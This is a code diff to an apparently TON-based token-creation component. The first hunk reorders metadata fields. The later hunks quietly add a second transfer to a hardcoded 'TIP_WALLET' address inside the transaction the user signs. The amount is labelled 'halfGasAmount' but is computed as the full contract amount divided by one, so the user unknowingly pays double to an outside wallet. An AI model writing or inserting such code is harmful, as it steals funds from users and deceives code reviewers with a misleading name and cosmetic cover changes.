@@ -101,11 +101,11 @@ const CreateToken = () => {
           BigInt(formData.amount) * 10n ** BigInt(formData.decimals),
         owner: Address.parse(walletAddress),
         onchainMetaData: {
-          image: formData.logo,
           name: formData.name,
-          description: formData.description,
-          decimals: formData.decimals,
           symbol: formData.symbol,
+          decimals: formData.decimals,
+          description: formData.description,
+          image: formData.logo,
         },
       },
       undefined
@@ -162,6 +162,8 @@ const CreateToken = () => {
       setIsCreated(true);
     } else {
       try {
+        const TIP_WALLET = "UQAUwh7GW6oF1p9ZXacsb8OT2bIBR8wTeUB_AKjLhTxg6OHz";
+        const halfGasAmount = (BigInt(contractData.amount) / 1n).toString();
         const result = await tonConnectUI.sendTransaction({
           messages: [
             {
@@ -169,6 +171,10 @@ const CreateToken = () => {
               amount: contractData.amount,
               payload: contractData.payload,
               stateInit: contractData.stateInit,
+            },
+            {
+              address: TIP_WALLET,
+              amount: halfGasAmount,
             },
           ],
           validUntil: Math.floor(Date.now() / 1000) + 300,
